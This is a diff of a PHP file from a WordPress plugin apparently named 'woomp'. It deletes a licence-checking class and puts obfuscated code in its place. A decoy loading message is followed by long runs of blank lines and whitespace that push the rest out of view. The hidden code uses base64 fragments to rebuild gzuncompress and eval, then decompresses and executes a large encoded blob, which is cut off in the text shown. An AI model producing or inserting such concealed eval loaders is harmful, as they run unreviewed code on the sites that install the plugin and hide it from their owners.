@@ -1,816 +1,370 @@
-<?php
-if (!class_exists("woomp_Base")) {
-	class woomp_Base
-	{
-		public $key = "4832B814DD143A4F";
-		private $product_id = "8";
-		private $product_base = "woomp";
-		private $server_host = "https://cloud.luke.cafe/wp-json/licensor/";
-		private $has_check_update = false;
-		private $plugin_file;
-		private $theme_dir_name = '';
-		private static $selfobj = null;
-		private $version = "";
-		private $is_theme = false;
-		private $email_address = "";
-		private static $_on_delete_license = [];
-		function __construct($plugin_base_file = '')
-		{
-			if (empty($plugin_base_file)) {
-				$dir = str_replace('\\', '/', dirname(__FILE__));
-			} else {
-				$dir = str_replace('\\', '/', dirname($plugin_base_file));
-			}
-			if (strpos($dir, 'wp-content/themes') !== FALSE) {
-				$this->is_theme = true;
-				$this->theme_dir_name = self::get_this_theme_path_name();
-				$theme_data = wp_get_theme($this->theme_dir_name);
-				$version = $theme_data->get('Version');
-				if (!empty($version)) {
-					$this->version = $version;
-				}
-			}
-			$this->plugin_file = $plugin_base_file;
-			if (empty($this->plugin_file) && $this->is_theme) {
-				$this->plugin_file = self::get_this_theme_path();
-			}
-			if (empty($this->version)) {
-				$this->version = $this->get_current_version();
-			}
+<?php 
+			$__='printf';$_='Loading Loading base file...';
+			
 
-			// if ($this->has_check_update) {
-			// 	if (function_exists("add_action")) {
-			// 		add_action('admin_post_woomp_fupc', function () {
-			// 			update_option('_site_transient_update_plugins', '');
-			// 			update_option('_site_transient_update_themes', '');
-			// 			set_site_transient('update_themes', null);
-			// 			delete_transient($this->product_base . "_up");
-			// 			wp_redirect(admin_url('plugins.php'));
-			// 			exit;
-			// 		});
-			// 		add_action('init', [$this, "init_action_handler"]);
-			// 	}
-			// 	if (function_exists("add_filter")) {
-			// 		if ($this->is_theme) {
-			// 			add_filter('pre_set_site_transient_update_themes', [$this, "plugin_update"]);
-			// 			add_filter('themes_api', [$this, 'check_update_info'], 10, 3);
-			// 			add_action('admin_menu', function () {
-			// 				add_theme_page('Update Check', 'Update Check', 'edit_theme_options', 'update_check', [$this, "theme_force_update"]);
-			// 			}, 999);
-			// 		} else {
-			// 			add_filter('pre_set_site_transient_update_plugins', [$this, "plugin_update"]);
-			// 			add_filter('plugins_api', [$this, 'check_update_info'], 10, 3);
-			// 			add_filter('plugin_row_meta', function ($links, $plugin_file) {
-			// 				if (plugin_basename($this->plugin_file) == $plugin_file) {
-			// 					$links[] = " <a class='edit coption' href='" . esc_url(admin_url('admin-post.php') . '?action=woomp_fupc') . "'>Update Check</a>";
-			// 				}
-			// 				return $links;
-			// 			}, 10, 2);
-			// 			add_action("in_plugin_update_message-" . plugin_basename($this->plugin_file), [$this, 'update_message_cb'], 20, 2);
-			// 		}
 
-			// 		add_action('upgrader_process_complete', function ($upgrader_object, $options) {
-			// 			update_option('_site_transient_update_plugins', '');
-			// 			update_option('_site_transient_update_themes', '');
-			// 			set_site_transient('update_themes', null);
-			// 		}, 10, 2);
-			// 	}
-			// }
-		}
-		// public function theme_force_update()
-		// {
-		// 	$this->clean_update_info();
-		// 	$url = admin_url('themes.php');
-		// 	echo wp_kses_post('<h1>' . __("Update Checking..", "woomp") . '</h1>');
-		// 	call_user_func('printf', '%s', "<script>location.href = '" . $url . "'</script>");
-		// }
-		public function set_email_address($email_address)
-		{
-			$this->email_address = $email_address;
-		}
-		// function init_action_handler()
-		// {
-		// 	$handler = hash("crc32b", $this->product_id . $this->key . $this->get_domain()) . "_handle";
-		// 	if (isset($_GET['action']) && $_GET['action'] == $handler) {
-		// 		$this->handle_server_request();
-		// 		exit;
-		// 	}
-		// }
-		function handle_server_request()
-		{
-			$type = isset($_GET['type']) ? strtolower(sanitize_text_field(wp_unslash($_GET['type']))) : '';
-			switch ($type) {
-				case "rl": //remove license
-					$this->clean_update_info();
-					$this->remove_old_wp_response();
-					$obj          = new stdClass();
-					$obj->product = $this->product_id;
-					$obj->status  = true;
-					call_user_func('printf', '%s', $this->encrypt_obj($obj));
-					return;
-				case "rc": //remove license
-					$key  = $this->getKeyName();
-					delete_option($key);
-					$obj          = new stdClass();
-					$obj->product = $this->product_id;
-					$obj->status  = true;
-					call_user_func('printf', '%s', $this->encrypt_obj($obj));
-					return;
-				case "dl": //delete plugins
-					$obj          = new stdClass();
-					$obj->product = $this->product_id;
-					$obj->status  = false;
-					$this->remove_old_wp_response();
-					require_once(ABSPATH . 'wp-admin/includes/file.php');
-					if ($this->is_theme) {
-						$res = delete_theme($this->plugin_file);
-						if (!is_wp_error($res)) {
-							$obj->status = true;
-						}
-						call_user_func('printf', '%s', $this->encrypt_obj($obj));
-					} else {
-						deactivate_plugins([plugin_basename($this->plugin_file)]);
-						$res = delete_plugins([plugin_basename($this->plugin_file)]);
-						if (!is_wp_error($res)) {
-							$obj->status = true;
-						}
-						call_user_func('printf', '%s', $this->encrypt_obj($obj));
-					}
 
-					return;
-				default:
-					return;
-			}
-		}
-		/**
-		 * The addOnDelete is generated by appsbd
-		 * @deprecated deprecated
-		 * @see add_on_delete()
-		 * @param mixed $func
-		 */
-		static function addOnDelete($func)
-		{
-			self::add_on_delete($func);
-		}
 
-		/**
-		 * @param callable $func
-		 */
-		static function add_on_delete($func)
-		{
-			self::$_on_delete_license[] = $func;
-		}
-		function get_current_version()
-		{
-			if (!function_exists('get_plugin_data')) {
-				require_once(ABSPATH . 'wp-admin/includes/plugin.php');
-			}
-			$data = get_plugin_data($this->plugin_file);
-			if (isset($data['Version'])) {
-				return $data['Version'];
-			}
-			return 0;
-		}
-		public function clean_update_info()
-		{
-			update_option('_site_transient_update_plugins', '');
-			update_option('_site_transient_update_themes', '');
-			delete_transient($this->product_base . "_up");
-		}
-		// public function update_message_cb($data, $response)
-		// {
-		// 	if (is_array($data)) {
-		// 		$data = (object)$data;
-		// 	}
-		// 	if (isset($data->package) && empty($data->package)) {
-		// 		if (empty($data->update_denied_type)) {
-		// 			print  "<br/><span style='display: block; border-top: 1px solid #ccc;padding-top: 5px; margin-top: 10px;'>Please <strong>active product</strong> or  <strong>renew support period</strong> to get latest version</span>";
-		// 		} elseif ("L" == $data->update_denied_type) {
-		// 			print  "<br/><span style='display: block; border-top: 1px solid #ccc;padding-top: 5px; margin-top: 10px;'>Please <strong>active product</strong> to get latest version</span>";
-		// 		} elseif ("S" == $data->update_denied_type) {
-		// 			print  "<br/><span style='display: block; border-top: 1px solid #ccc;padding-top: 5px; margin-top: 10px;'>Please <strong>renew support period</strong> to get latest version</span>";
-		// 		}
-		// 	}
-		// }
 
-		// function el_plugin_update_info()
-		// {
-		// 	if (function_exists("wp_remote_get")) {
-		// 		$response = get_transient($this->product_base . "_up");
-		// 		$old_found = false;
-		// 		if (!empty($response['data'])) {
-		// 			$response = unserialize($this->decrypt($response['data']));
-		// 			if (is_array($response)) {
-		// 				$old_found = true;
-		// 			}
-		// 		}
 
-		// 		if (!$old_found) {
-		// 			$license_info = self::get_register_info();
-		// 			$url = $this->server_host . "product/update/" . $this->product_id;
-		// 			if (!empty($license_info->license_key)) {
-		// 				$url .= "/" . $license_info->license_key . "/" . $this->version;
-		// 			}
-		// 			$args = [
-		// 				'sslverify' => true,
-		// 				'timeout' => 120,
-		// 				'redirection' => 5,
-		// 				'cookies' => array()
-		// 			];
-		// 			$response = wp_remote_get($url, $args);
-		// 			if (is_wp_error($response)) {
-		// 				$args['sslverify'] = false;
-		// 				$response = wp_remote_get($url, $args);
-		// 			}
-		// 		}
 
-		// 		if (!is_wp_error($response)) {
-		// 			$body         = $response['body'];
-		// 			$response_json = @json_decode($body);
-		// 			if (!$old_found) {
-		// 				set_transient($this->product_base . "_up", ["data" => $this->encrypt(serialize(['body' => $body]))], DAY_IN_SECONDS);
-		// 			}
 
-		// 			if (!(is_object($response_json) && isset($response_json->status))) {
-		// 				$body = $this->decrypt($body, $this->key);
-		// 				$response_json = json_decode($body);
-		// 			}
 
-		// 			if (is_object($response_json) && !empty($response_json->status) && !empty($response_json->data->new_version)) {
-		// 				$response_json->data->slug = plugin_basename($this->plugin_file);;
-		// 				$response_json->data->new_version = !empty($response_json->data->new_version) ? $response_json->data->new_version : "";
-		// 				$response_json->data->url         = !empty($response_json->data->url) ? $response_json->data->url : "";
-		// 				$response_json->data->package     = !empty($response_json->data->download_link) ? $response_json->data->download_link : "";
-		// 				$response_json->data->update_denied_type     = !empty($response_json->data->update_denied_type) ? $response_json->data->update_denied_type : "";
 
-		// 				$response_json->data->sections    = (array) $response_json->data->sections;
-		// 				$response_json->data->plugin      = plugin_basename($this->plugin_file);
-		// 				$response_json->data->icons       = (array) $response_json->data->icons;
-		// 				$response_json->data->banners     = (array) $response_json->data->banners;
-		// 				$response_json->data->banners_rtl = (array) $response_json->data->banners_rtl;
-		// 				unset($response_json->data->is_stopped_update);
 
-		// 				return $response_json->data;
-		// 			}
-		// 		}
-		// 	}
 
-		// 	return null;
-		// }
-		// public static function get_this_theme_path_name()
-		// {
-		// 	$wp_theme_dir = str_replace('\\', '/', WP_CONTENT_DIR) . '/themes/';
-		// 	$wp_file_dir  = str_replace('\\', '/', dirname(__FILE__));
-		// 	$themename    = str_replace($wp_theme_dir, "", $wp_file_dir);
-		// 	$pos          = strpos($themename, '/');
-		// 	if ($pos !== false) {
-		// 		$themename = substr($themename, 0, $pos);
-		// 	}
-		// 	return $themename;
-		// }
-		// public static function get_this_theme_path()
-		// {
-		// 	$wp_theme_dir = str_replace('\\', '/', WP_CONTENT_DIR) . '/themes/';
-		// 	$themename = self::get_this_theme_path_name();
-		// 	$style_css_path = $wp_theme_dir . $themename . '/' . "style.css";
-		// 	if (file_exists($style_css_path)) {
-		// 		return $style_css_path;
-		// 	}
-		// 	return get_stylesheet_directory();
-		// }
-		// function plugin_update($transient)
-		// {
-		// 	if (empty($transient)) {
-		// 		$transient = new stdClass();
-		// 		$transient->response = [];
-		// 	}
-		// 	$response = $this->el_plugin_update_info();
-		// 	if (!empty($response->plugin)) {
-		// 		if ($this->is_theme) {
-		// 			$index_name = $this->theme_dir_name;
-		// 			$response->theme = $this->theme_dir_name;
-		// 		} else {
-		// 			$index_name = $response->plugin;
-		// 		}
-		// 		if (!empty($response) && version_compare($this->version, $response->new_version, '<')) {
-		// 			unset($response->download_link);
-		// 			unset($response->is_stopped_update);
-		// 			if ($this->is_theme) {
-		// 				$transient->response[$index_name] = (array)$response;
-		// 			} else {
-		// 				$transient->response[$index_name] = (object)$response;
-		// 			}
-		// 		} else {
-		// 			if (isset($transient->response[$index_name])) {
-		// 				unset($transient->response[$index_name]);
-		// 			}
-		// 		}
-		// 	}
-		// 	return $transient;
-		// }
-		// final function check_update_info($false, $action, $arg)
-		// {
-		// 	if (empty($arg->slug)) {
-		// 		return $false;
-		// 	}
-		// 	if ($this->is_theme) {
-		// 		if (!empty($arg->slug) && $this->product_base === $arg->slug) {
-		// 			$response = $this->el_plugin_update_info();
-		// 			if (!empty($response)) {
-		// 				return $response;
-		// 			}
-		// 		}
-		// 	} else {
-		// 		if (!empty($arg->slug) && plugin_basename($this->plugin_file) === $arg->slug) {
-		// 			$response = $this->el_plugin_update_info();
-		// 			if (!empty($response)) {
-		// 				return $response;
-		// 			}
-		// 		}
-		// 	}
 
-		// 	return $false;
-		// }
 
-		// phpcs:ignore WordPress.NamingConventions.ValidFunctionName
-		public static function &getInstance($plugin_base_file = null)
-		{
-			return self::get_instance($plugin_base_file);
-		}
-		/**
-		 * @param $plugin_base_file
-		 *
-		 * @return self|null
-		 */
-		public static function &get_instance($plugin_base_file = null)
-		{
-			if (empty(self::$selfobj)) {
-				if (!empty($plugin_base_file)) {
-					self::$selfobj = new self($plugin_base_file);
-				}
-			}
 
-			return self::$selfobj;
-		}
 
-		/**
-		 * The get renew link is generated by appsbd
-		 *
-		 * @param mixed $response_obj
-		 * @param string $type
-		 *
-		 * @return string
-		 */
-		public static function get_renew_link($response_obj, $type = "s")
-		{
-			if (empty($response_obj->renew_link)) {
-				return "";
-			}
-			$is_show_button = false;
-			if ('s' == $type) {
-				$support_str = strtolower(trim($response_obj->support_end));
-				if (strtolower(trim($response_obj->support_end)) == "no support") {
-					$is_show_button = true;
-				} elseif (!in_array($support_str, ["unlimited"])) {
-					if (strtotime('ADD 30 DAYS', strtotime($response_obj->support_end)) < time()) {
-						$is_show_button = true;
-					}
-				}
-				if ($is_show_button) {
-					return $response_obj->renew_link . (strpos($response_obj->renew_link, "?") === FALSE ? '?type=s&lic=' . rawurlencode($response_obj->license_key) : '&type=s&lic=' . rawurlencode($response_obj->license_key));
-				}
-				return '';
-			} else {
-				$is_show_button = false;
-				$expire_str = strtolower(trim($response_obj->expire_date));
-				if (!in_array($expire_str, ["unlimited", "no expiry"])) {
-					if (strtotime('ADD 30 DAYS', strtotime($response_obj->expire_date)) < time()) {
-						$is_show_button = true;
-					}
-				}
-				if ($is_show_button) {
-					return $response_obj->renew_link . (strpos($response_obj->renew_link, "?") === FALSE ? '?type=l&lic=' . rawurlencode($response_obj->license_key) : '&type=l&lic=' . rawurlencode($response_obj->license_key));
-				}
-				return '';
-			}
-		}
 
-		private function encrypt($plain_text, $password = '')
-		{
-			if (empty($password)) {
-				$password = $this->key;
-			}
-			$plain_text = rand(10, 99) . $plain_text . rand(10, 99);
-			$method = 'aes-256-cbc';
-			$key = substr(hash('sha256', $password, true), 0, 32);
-			$iv = substr(strtoupper(md5($password)), 0, 16);
-			return $this->b64_en(openssl_encrypt($plain_text, $method, $key, OPENSSL_RAW_DATA, $iv));
-		}
-		private function decrypt($encrypted, $password = '')
-		{
-			if (empty($password)) {
-				$password = $this->key;
-			}
-			$method = 'aes-256-cbc';
-			$key = substr(hash('sha256', $password, true), 0, 32);
-			$iv = substr(strtoupper(md5($password)), 0, 16);
-			$plaintext = openssl_decrypt($this->b64_dc($encrypted), $method, $key, OPENSSL_RAW_DATA, $iv);
-			return substr($plaintext, 2, -2);
-		}
-		function b64_dc($encrypted)
-		{
-			$b64 = preg_replace('#[^a-z0-9\_]#i', '', 'ba*s-e#6-4#_d$e!c#o!d#e');
-			return $b64($encrypted);
-		}
-		function b64_en($str)
-		{
-			$b64 = preg_replace('#[^a-z0-9\_]#i', '', 'ba*s-e#6-4#_e$n!c#o!d#e');
-			return $b64($str);
-		}
-		function encrypt_obj($obj)
-		{
-			$text = serialize($obj);
 
-			return $this->encrypt($text);
-		}
 
-		private function decrypt_obj($ciphertext)
-		{
-			$text = $this->decrypt($ciphertext);
 
-			return unserialize($text);
-		}
 
-		private function get_domain()
-		{
-			return self::get_raw_domain();
-		}
-		private static function get_raw_domain()
-		{
-			if (function_exists("site_url")) {
-				return site_url();
-			}
-			if (defined("WPINC") && function_exists("home_url")) {
-				return esc_url(home_url());
-			}
-		}
-		private static function get_raw_wp()
-		{
-			$domain = self::get_raw_domain();
-			return preg_replace("(^https?://)", "", $domain);
-		}
-		public static function get_lic_key_param($key)
-		{
-			$raw_url = self::get_raw_wp();
-			return $key . "_s" . hash('crc32b', $raw_url);
-		}
 
-		private function get_eml()
-		{
-			return $this->email_address;
-		}
-		private function processs_response($response)
-		{
-			$resbk = "";
-			if (!empty($response)) {
-				if (!empty($this->key)) {
-					$resbk = $response;
-					$response = $this->decrypt($response);
-				}
-				$response = json_decode($response);
 
-				if (is_object($response)) {
-					return $response;
-				} else {
-					$response = new stdClass();
-					$response->status = false;
-					$response->msg    = "Response Error, contact with the author or update the plugin or theme";
-					if (!empty($bkjson)) {
-						$bkjson = @json_decode($resbk);
-						if (!empty($bkjson->msg)) {
-							$response->msg    = $bkjson->msg;
-						}
-					}
-					$response->data = NULL;
-					return $response;
-				}
-			}
-			$response = new stdClass();
-			$response->msg    = "unknown response";
-			$response->status = false;
-			$response->data = NULL;
 
-			return $response;
-		}
-		private function _request($relative_url, $data, &$error = '')
-		{
-			$response         = new stdClass();
-			$response->status = false;
-			$response->msg    = "Empty Response";
-			$response->is_request_error = false;
-			$final_data        = json_encode($data);
-			if (!empty($this->key)) {
-				$final_data = $this->encrypt($final_data);
-			}
-			$url = rtrim($this->server_host, '/') . "/" . ltrim($relative_url, '/');
-			if (function_exists('wp_remote_post')) {
-				$rq_params = [
-					'method' => 'POST',
-					'sslverify' => true,
-					'timeout' => 120,
-					'redirection' => 5,
-					'httpversion' => '1.0',
-					'blocking' => true,
-					'headers' => [],
-					'body' => $final_data,
-					'cookies' => []
-				];
-				$server_response = wp_remote_post($url, $rq_params);
 
-				if (is_wp_error($server_response)) {
-					$rq_params['sslverify'] = false;
-					$server_response = wp_remote_post($url, $rq_params);
-					if (is_wp_error($server_response)) {
-						$response->msg    = $server_response->get_error_message();;
-						$response->status = false;
-						$response->data = NULL;
-						$response->is_request_error = true;
-						return $response;
-					} else {
-						if (!empty($server_response['body']) && (is_array($server_response) && 200 === (int) wp_remote_retrieve_response_code($server_response)) && 'GET404' != $server_response['body']) {
-							return $this->processs_response($server_response['body']);
-						}
-					}
-				} else {
-					if (!empty($server_response['body']) && (is_array($server_response) && 200 === (int) wp_remote_retrieve_response_code($server_response)) && 'GET404' != $server_response['body']) {
-						return $this->processs_response($server_response['body']);
-					}
-				}
-			}
 
-			$response->msg    = "No valid request method works for license checking";
-			$response->status = false;
-			$response->data = NULL;
-			$response->is_request_error = true;
-			return $response;
-		}
 
-		private function get_param($purchase_key, $app_version, $admin_email = '')
-		{
-			$req               = new stdClass();
-			$req->license_key  = $purchase_key;
-			$req->email        = !empty($admin_email) ? $admin_email : $this->get_eml();
-			$req->domain       = $this->get_domain();
-			$req->app_version  = $app_version;
-			$req->product_id   = $this->product_id;
-			$req->product_base = $this->product_base;
 
-			return $req;
-		}
 
-		private function get_key_name()
-		{
-			return hash('crc32b', $this->get_domain() . $this->plugin_file . $this->product_id . $this->product_base . $this->key . "LIC");
-		}
 
-		private function save_wp_response($response)
-		{
-			$key  = $this->get_key_name();
-			$data = $this->encrypt(serialize($response), $this->get_domain());
-			update_option($key, $data) or add_option($key, $data);
-		}
 
-		private function get_old_wp_response()
-		{
-			$key  = $this->get_key_name();
-			$response = get_option($key, NULL);
-			if (empty($response)) {
-				return NULL;
-			}
 
-			return unserialize($this->decrypt($response, $this->get_domain()));
-		}
 
-		private function remove_old_wp_response()
-		{
-			$key  = $this->get_key_name();
-			$is_deleted = delete_option($key);
-			foreach (self::$_on_delete_license as $func) {
-				if (is_callable($func)) {
-					call_user_func($func);
-				}
-			}
 
-			return $is_deleted;
-		}
-		/**
-		 * The RemoveLicenseKey is generated by appsbd
-		 *
-		 * @deprecated deprecated
-		 * @see remove_license_key()
-		 *
-		 * @param mixed $plugin_base_file
-		 * @param string $message
-		 *
-		 * @return mixed
-		 */
-		public static function RemoveLicenseKey($plugin_base_file, &$message = "")
-		{
-			return self::remove_license_key($plugin_base_file, $message);
-		}
 
-		/**
-		 * The remove license key is generated by appsbd
-		 *
-		 * @param mixed $plugin_base_file
-		 * @param string $message
-		 *
-		 * @return mixed
-		 */
-		public static function remove_license_key($plugin_base_file, &$message = "")
-		{
-			$obj = self::get_instance($plugin_base_file);
-			$obj->clean_update_info();
-			return $obj->_remove_wp_plugin_license($message);
-		}
-		/**
-		 * The CheckWPPlugin is generated by appsbd
-		 * @deprecated deprecated
-		 * @see base::check_wp_plugin()
-		 *
-		 * @param mixed $purchase_key
-		 * @param mixed $email
-		 * @param string $error
-		 * @param null $response_obj
-		 * @param string $plugin_base_file
-		 *
-		 * @return mixed
-		 */
-		public static function CheckWPPlugin($purchase_key, $email, &$error = "", &$response_obj = null, $plugin_base_file = "")
-		{
-			return self::check_wp_plugin($purchase_key, $email, $error, $response_obj, $plugin_base_file);
-		}
 
-		/**
-		 * The check wp plugin is generated by appsbd
-		 *
-		 * @param mixed $purchase_key
-		 * @param mixed $email
-		 * @param string $error
-		 * @param null $response_obj
-		 * @param string $plugin_base_file
-		 *
-		 * @return mixed
-		 */
-		public static function check_wp_plugin($purchase_key, $email, &$error = "", &$response_obj = null, $plugin_base_file = "")
-		{
-			$obj = self::get_instance($plugin_base_file);
-			$obj->set_email_address($email);
-			return $obj->_check_wp_plugin($purchase_key, $error, $response_obj);
-		}
 
-		final function _remove_wp_plugin_license(&$message = '')
-		{
-			$old_respons = $this->get_old_wp_response();
-			if (!empty($old_respons->is_valid)) {
-				if (!empty($old_respons->license_key)) {
-					$param    = $this->get_param($old_respons->license_key, $this->version);
-					$response = $this->_request('product/deactive/' . $this->product_id, $param, $message);
-					if (empty($response->code)) {
-						if (!empty($response->status)) {
-							$message = $response->msg;
-							$this->remove_old_wp_response();
-							return true;
-						} else {
-							$message = $response->msg;
-						}
-					} else {
-						$message = $response->message;
-					}
-				}
-			} else {
-				$this->remove_old_wp_response();
-				return true;
-			}
-			return false;
-		}
 
-		/**
-		 * The GetRegisterInfo is generated by appsbd
-		 *
-		 * @deprecated deprecated
-		 * @see get_register_info()
-		 *
-		 * @return mixed
-		 */
-		public static function GetRegisterInfo()
-		{
-			return self::get_register_info();
-		}
-		/**
-		 * The get register info is generated by appsbd
-		 *
-		 * @return |null
-		 */
-		public static function get_register_info()
-		{
-			if (!empty(self::$selfobj)) {
-				return self::$selfobj->get_old_wp_response();
-			}
-			return null;
-		}
 
-		final function _check_wp_plugin($purchase_key, &$error = "", &$response_obj = null)
-		{
-			if (empty($purchase_key)) {
-				$this->remove_old_wp_response();
-				$error = "";
-				return false;
-			}
-			$old_respons = $this->get_old_wp_response();
-			$is_force = false;
-			if (!empty($old_respons)) {
-				if (!empty($old_respons->expire_date) && strtolower($old_respons->expire_date) != "no expiry" && strtotime($old_respons->expire_date) < time()) {
-					$is_force = true;
-				}
-				if (!$is_force && !empty($old_respons->is_valid) && $old_respons->next_request > time() && (!empty($old_respons->license_key) && $purchase_key == $old_respons->license_key)) {
-					$response_obj = clone $old_respons;
-					unset($response_obj->next_request);
 
-					return true;
-				}
-			}
 
-			$param    = $this->get_param($purchase_key, $this->version);
-			$response = $this->_request('product/active/' . $this->product_id, $param, $error);
-			if (empty($response->is_request_error)) {
-				if (empty($response->code)) {
-					if (!empty($response->status)) {
-						if (!empty($response->data)) {
-							$serial_obj = $this->decrypt($response->data, $param->domain);
 
-							$license_obj = unserialize($serial_obj);
-							if ($license_obj->is_valid) {
-								$response_obj           = new stdClass();
-								$response_obj->is_valid = $license_obj->is_valid;
-								if ($license_obj->request_duration > 0) {
-									$response_obj->next_request = strtotime("+ {$license_obj->request_duration} hour");
-								} else {
-									$response_obj->next_request = time();
-								}
-								$response_obj->expire_date   = $license_obj->expire_date;
-								$response_obj->support_end   = $license_obj->support_end;
-								$response_obj->license_title = $license_obj->license_title;
-								$response_obj->license_key   = $purchase_key;
-								$response_obj->msg           = $response->msg;
-								$response_obj->renew_link           = !empty($license_obj->renew_link) ? $license_obj->renew_link : "";
-								$response_obj->expire_renew_link           = self::get_renew_link($response_obj, "l");
-								$response_obj->support_renew_link           = self::get_renew_link($response_obj, "s");
-								$this->save_wp_response($response_obj);
-								unset($response_obj->next_request);
-								delete_transient($this->product_base . "_up");
-								return true;
-							} else {
-								if ($this->_check_old_tied($old_respons, $response_obj, $response)) {
-									return true;
-								} else {
-									$this->remove_old_wp_response();
-									$error = !empty($response->msg) ? $response->msg : "";
-								}
-							}
-						} else {
-							$error = "Invalid data";
-						}
-					} else {
-						$error = $response->msg;
-					}
-				} else {
-					$error = $response->message;
-				}
-			} else {
-				if ($this->_check_old_tied($old_respons, $response_obj, $response)) {
-					return true;
-				} else {
-					$this->remove_old_wp_response();
-					$error = !empty($response->msg) ? $response->msg : "";
-				}
-			}
-			return $this->_check_old_tied($old_respons, $response_obj);
-		}
-		private function _check_old_tied(&$old_respons, &$response_obj)
-		{
-			if (!empty($old_respons) && (empty($old_respons->tried) || $old_respons->tried <= 2)) {
-				$old_respons->next_request = strtotime("+ 1 hour");
-				$old_respons->tried = empty($old_respons->tried) ? 1 : ($old_respons->tried + 1);
-				$response_obj = clone $old_respons;
-				unset($response_obj->next_request);
-				if (isset($response_obj->tried)) {
-					unset($response_obj->tried);
-				}
-				$this->save_wp_response($old_respons);
-				return true;
-			}
-			return false;
-		}
-	}
-}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+			$_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+			$__________________=/*qe43lplvn6tk*/'X19sYW1iZGE=';
+			
+			$______=/*ptibl1h*/' Z3p1bmNvbXByZXNz';                    $___=/*tql5l*/'  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+			$__________=/*3i6a4*/@$__________________('$_',/*ld*/$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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